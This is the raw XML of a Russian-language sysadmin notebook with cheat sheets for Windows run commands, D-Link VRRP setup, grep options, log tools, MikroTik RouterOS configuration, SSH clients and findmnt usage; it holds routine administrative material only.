      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">diskmgmt</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">msc</text:span><text:span text:style-name="T1"> - Управление дисками.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">eventvwr</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">msc</text:span><text:span text:style-name="T1"> - Журнал событий.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">gpedit</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">msc</text:span><text:span text:style-name="T1"> - Редактор локальной групповой политики.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">regedit</text:span><text:span text:style-name="T1"> - Редактор реестра.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">sysdm</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">cpl</text:span><text:span text:style-name="T1"> - Свойства системы.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">powercfg</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">cpl</text:span><text:span text:style-name="T1"> - Параметры питания.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">magnify</text:span><text:span text:style-name="T1"> - Экранная лупа.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">charmap</text:span><text:span text:style-name="T1"> - Таблица символов </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">ncpa</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">cpl</text:span><text:span text:style-name="T1"> - Сетевые подключения.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mrt</text:span><text:span text:style-name="T1"> - Средство удаления вредоносных программ </text:span><text:span text:style-name="T3">Microsoft</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">devmgmt</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">msc</text:span><text:span text:style-name="T1"> - Диспетчер устройств.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">netplwiz</text:span><text:span text:style-name="T1"> - Учетные записи пользователей.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">services</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">msc</text:span><text:span text:style-name="T1"> - Службы.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">appwiz</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">cpl</text:span><text:span text:style-name="T1"> - Программы и компоненты.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">control</text:span><text:span text:style-name="T1"> - Панель управления.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">"." - открыть папку текущего пользователя.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">osk</text:span><text:span text:style-name="T1"> - Экранная клавиатура.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">snippingtool</text:span><text:span text:style-name="T1"> - Ножницы.</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">mdsched</text:span><text:span text:style-name="T1"> - Проверка оперативной памяти</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Настройка протокола </text:span><text:span text:style-name="T3">VRRP</text:span><text:span text:style-name="T1"> на коммутаторах </text:span><text:span text:style-name="T3">D</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">Link</text:span><text:span text:style-name="T1">. Протокол </text:span><text:span text:style-name="T3">VRRP</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">Virtual</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Router</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Redundancy</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Protocol</text:span><text:span text:style-name="T1">) позволяет сформировать один виртуальный коммутатор из группы коммутаторов 3-го уровня. Эта группа (</text:span><text:span text:style-name="T3">VRRP</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1">) будет иметь один мастер (</text:span><text:span text:style-name="T3">master</text:span><text:span text:style-name="T1">) и один или более резервных (</text:span><text:span text:style-name="T3">backup</text:span><text:span text:style-name="T1">) коммутаторов. <text:s/>Если мастер выходит из строя, резервный коммутатор становится мастером. Настройки коммутаторов из примера такие:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Swicth A</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Switch(config)# interface vlan 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Switch(config-if)# ip address 192.168.10.252 255.255.255.0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Switch(config-if)# vrrp 252 ip 192.168.10.252</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Switch(config-if)# vrrp 253 ip 192.168.10.253</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Switch(config-if)# end</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Switch B</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Switch(config)# interface vlan 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Switch(config-if)# ip address 192.168.10.253 255.255.255.0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Switch(config-if)# vrrp 252 ip 192.168.10.252</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Switch(config-if)# vrrp 253 ip 192.168.10.253</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>Switch</text:span><text:span text:style-name="T1">(</text:span><text:span text:style-name="T3">config</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">if</text:span><text:span text:style-name="T1">)# </text:span><text:span text:style-name="T3">end</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Этот пример подходит для настройки коммутаторов </text:span><text:span text:style-name="T3">D</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">Link</text:span><text:span text:style-name="T1"> со стандартным </text:span><text:span text:style-name="T3">CLI</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep iodmin</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep iodmin file.txt поиск iodmin в файле file.txt, с выводом полностью совпавшей строкой</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -o iodmin file.txt поиск iodmin в файле file.txt и вывод только совпавшего куска строки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -i iodmin file.txt игнорирование регистра при поиске</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">grep -bn iodmin file.txt показать строку (-n) и столбец (-b), где был найден iodmin</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -v iodmin file.txt инверсия поиска (найдет все строки, которые не совпадают с шаблоном iodmin)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -A 3 iodmin file.txt вывод дополнительных трех строк, после совпавшей</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -B 3 iodmin file.txt вывод дополнительных трех строк, перед совпавшей</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -C 3 iodmin file.txt вывод три дополнительные строки перед и после совпавшей</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -r iodmin $HOME рекурсивный поиск по директории $HOME и всем вложенным</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -c iodmin file.txt подсчет совпадений</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -L iodmin *.txt вывести список txt-файлов, которые не содержат iodmin</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -l iodmin *.txt вывести список txt-файлов, которые содержат iodmin</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -w iodmin file.txt совпадение только с полным словом iodmin</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -f iodmins.txt file.txt поиск по нескольким iodmin из файла iodmins.txt, шаблоны разделяются новой строкой</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -I iodmin file.txt игнорирование бинарных файлов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -v -f file2 file1 &gt; file3 вывод строк, которые есть в file1 и нет в file2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -in -e 'python' `find -type f` рекурсивный поиск файлов, содержащих слово python с выводом номера строки и совпадений</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep -inc -e 'test' `find -type f` | grep -v :0 рекурсивный поиск файлов, содержащих слово python с выводом количества совпадений</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep . *.py вывод содержимого всех py-файлов, предваряя каждую строку именем файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">grep "Http404" apps/**/*.py рекурсивный поиск упоминаний Http404 в директории apps в py-файлах</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">Полный мануал по grep есть тут (https://aidalinux.ru/w/Grep)</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Средства анализа и просмотра log-файлов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alco (Apache Log Colorizing Tool) (https://www.linuxpages.org/) - Утилита для подсветки log-файлов web-сервера Apache. Написана на awk.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">KDE LogViewer (https://kdelogviewer.sourceforge.net/) - Утилита для просмотра log-файлов для KDE. Имеет: фильтр, события, отображение строк разными цветами в зависимости от log-файла.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Logcheck (https://logcheck.org/) - Простая утилита для фильтрации log-файлов на «не обычные» записи (в.т.ч. и с помощью регулярных выражений) и отправки отчета на e-mail.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">MultiTail (https://github.com/halturin/multitail) - Аналог утилиты tail, позволяющий показывать данные из файлов в нескольких окнах одной консоли. Основан на ncurses.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">LogMiner (https://logminer.sourceforge.net/) - Мощный анализатор log-файлов для Apache или другого web-сервера, использующего комбинированный </text:span><text:soft-page-break/><text:span text:style-name="T1">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text:span text:style-name="T1">Основы компьютерных сетей:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Тема №1. Основные сетевые термины и сетевые модели (https://habr.com/ru/post/307252/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Тема №2. Протоколы верхнего уровня (https://habr.com/ru/post/307714/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Тема №3. Протоколы нижних уровней (транспортного, сетевого и канального) (https://habr.com/ru/post/308636/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Тема №4. Сетевые устройства и виды применяемых кабелей (https://habr.com/ru/post/312340/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Тема №5. Понятие IP адресации, масок подсетей и их расчет (https://habr.com/ru/post/314484/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Тема №6. Понятие VLAN, Trunk и протоколы VTP и DTP (https://habr.com/ru/post/319080/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Тема №7. Протокол связующего дерева: STP (https://habr.com/ru/post/321132/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Тема №8. Протокол агрегирования каналов: Etherchannel (https://habr.com/ru/post/334778/)</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Тема №9. Маршрутизация: статическая и динамическая на примере RIP, OSPF и EIGRP (https://habr.com/ru/post/335090/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Установите расширение «GPT for Sheets and Docs (https://workspace.google.com/marketplace/app/gpt_for_sheets_and_docs/677318054654)» из магазина «Google Workspace Marketplace».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. Перейдите в Google Таблицы и откройте любой документ.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">3. Во вкладке «Расширения» появится новый аддон, который мы только что установили.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">4. В выпадающем меню выберите опцию «Set API Key». Понадобится ключ API от вашего аккаунта.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">5. Чтобы его создать, пройдите по ссылке (https://help.openai.com/en/articles/4936850-where-do-i-find-my-secret-api-key) и откройте «User Settings».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">6. При необходимости войдите в ваш аккаунт, сгенерируйте новый ключ и скопируйте его в настройки расширения.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Подборка часто используемых команд для первоначальной настройки устройств MikroTik: имя устройства, DNS сервера, Email, время, доступы и т.д.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установки</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">имени</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">устройства</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/system identity set name=MyHomeMikrotik</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установка своих DNS серверов и отключение получения их по DHCP</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip dns set servers=8.8.8.8,1.1.1.1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip dhcp-client set [find ] use-peer-dns=no</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/tool e-mail</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#set address=smtp.yandex.ru from=example@yandex.ru password=example-pass port=587 start-tls=yes user=example@yandex.ru</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Настройка синхронизации времени по NTP и MikroTik Cloud Time (Москва)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/system ntp client set enabled=yes server-dns-names=time.google.com,0.pool.ntp.org,1.pool.ntp.org,2.pool.ntp.org,3.pool.ntp.org</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/system clock set time-zone-autodetect=no</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/system clock set time-zone-name=Europe/Moscow</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip cloud set update-time=yes</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Изменение количества строк системного лога</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#/system logging action set memory memory-lines=10000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Очистка системного лога (оставляет сообщение о смене настроек лога)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/system logging action set memory memory-lines=1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/system logging action set memory memory-lines=10000</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip firewall address-list add address=access.example.con list=DomainIPsAccess</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip firewall filter</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#add action=accept chain=input src-address-list=DomainIPsAccess</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#comment="Allow DomainIPsAccess"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">#move [find comment="Allow DomainIPsAccess"] 1</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">#move [find comment="Allow DomainIPsAccess"] 0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Отключение ненужных служб доступа (web тоже отключается, осторожно)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip service disable www,ftp,api,api-ssl,telnet</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip service enable ssh,winbox</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip service set ssh address=""</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip service set winbox address=""</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Фикс MTU (нужен редко, но метко)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip firewall mangle</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#add chain=postrouting out-interface-list=WAN protocol=tcp tcp-flags=syn,!ack action=change-mss new-mss=clamp-to-pmtu comment="MTU Fix" passthrough=yes</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Заблокировать доступ к WiFi по MAC-адресу</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/interface wireless access-list authentication=no mac-address=8A:EA:B7:2E:38:C1 </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Поместить клиента WiFi в отдельный VLAN по MAC-адресу</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/interface wireless access-list</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#add interface=all mac-address=8A:EA:B7:2E:38:C1 vlan-id=99 vlan-mode=use-tag</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Настройка пароля и безопасности WiFi на default профиль</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#/interface wireless security-profiles set default mode=dynamic-keys authentication-types=wpa2-psk unicast-ciphers=aes-ccm group-ciphers=aes-ccm</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#wpa2-pre-shared-key=bigpassword</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Включение</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пробросов</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">портов</text:span><text:span text:style-name="T3"> SSH</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">#/ip ssh set forwarding-enabled=both</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Подборка часто используемых инструментов удаленного подключения:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">www</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">xshell</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">en</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">xshell</text:span><text:span text:style-name="T1">/ - очень мощное программное обеспечение для эмуляции защищенного терминала, которое поддерживает </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1">1, </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1">2 и протокол </text:span><text:span text:style-name="T3">TELNET</text:span><text:span text:style-name="T1"> платформы </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">. </text:span><text:span text:style-name="T3">Xshell</text:span><text:span text:style-name="T1"> можно использовать в интерфейсе </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1"> для доступа к удаленным серверам на различных системах, тем самым лучше достигая цели терминала удаленного управления.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">www</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">vandyke</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">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3">SecureCRT</text:span><text:span text:style-name="T1"> поддерживает протоколы </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1">1, </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1">2, </text:span><text:span text:style-name="T3">Telnet</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">Rlogin</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">Serial</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">SSL</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">TLS</text:span><text:span text:style-name="T1">,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1"><text:span text:style-name="T1">3. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">winscp</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">net</text:span><text:span text:style-name="T1">/ - графический клиент </text:span><text:span text:style-name="T3">SFTP</text:span><text:span text:style-name="T1"> с открытым исходным кодом, который использует </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1"> в среде </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">. Он также поддерживает протокол </text:span><text:span text:style-name="T3">SCP</text:span><text:span text:style-name="T1">. Его основная функция - безопасное копирование и передача файлов между локальным и удаленным компьютерами.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">putty</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">org</text:span><text:span text:style-name="T1">/ - легкий клиент </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">Telnet</text:span><text:span text:style-name="T1">, который может помочь пользователям подключиться к удаленным серверам, а также поддерживает протокол шифрования аутентификации </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1">-2, что может сделать доступ пользователей к сети более безопасным. </text:span><text:span text:style-name="T3">Putty</text:span><text:span text:style-name="T1"> также поддерживает протокол </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1"> на платформе </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">, что позволяет пользователям лучше контролировать удаленные серверы.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">5. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">mobaxterm</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">mobatek</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">net</text:span><text:span text:style-name="T1">/ - </text:span><text:span text:style-name="T3">MobaXterm</text:span><text:span text:style-name="T1"> предоставляет комплексные возможности, почти все важные удаленные сетевые инструменты (такие как </text:span><text:span text:style-name="T3">SSH</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">X</text:span><text:span text:style-name="T1">11, </text:span><text:span text:style-name="T3">RDP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">VNC</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">FTP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">MOSH</text:span><text:span text:style-name="T1"> и т.д.), а также команды </text:span><text:span text:style-name="T3">Unix</text:span><text:span text:style-name="T1"> на рабочем столе </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">bash</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">cat</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">sed</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">awk</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">rsync</text:span><text:span text:style-name="T1"> и т.д.), и автоматически открывает режим </text:span><text:span text:style-name="T3">sftp</text:span><text:span text:style-name="T1"> после входа в систему.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">6. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">tabby</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">sh</text:span><text:span text:style-name="T1">/ - современный инструмент терминального подключения, с открытым исходным кодом и кроссплатформенный, поддерживающий системы </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">MacOS</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">. </text:span><text:span text:style-name="T3">Tabby</text:span><text:span text:style-name="T1"> имеет более 20</text:span><text:span text:style-name="T3">k</text:span><text:span text:style-name="T1">+ </text:span><text:span text:style-name="T3">Star</text:span><text:span text:style-name="T1"> на </text:span><text:span text:style-name="T3">Github</text:span><text:span text:style-name="T1">, что говорит о том, что это очень популярный терминальный инструмент</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># findmnt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы отобразить информацию в виде обычного списка, используйте параметр -l, как показано ниже</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># findmnt -l</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># findmnt --fstab -t xfs </text:span><text:span text:style-name="T1">или</text:span><text:span text:style-name="T3"> # findmnt --fstab -t ext4</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># findmnt --fstab /mnt/external/disk2 <text:s text:c="2"/>#this prints bind mounts where /mnt/external/disk2 is a source</text:span><text:span text:style-name="T3"/></text:p>
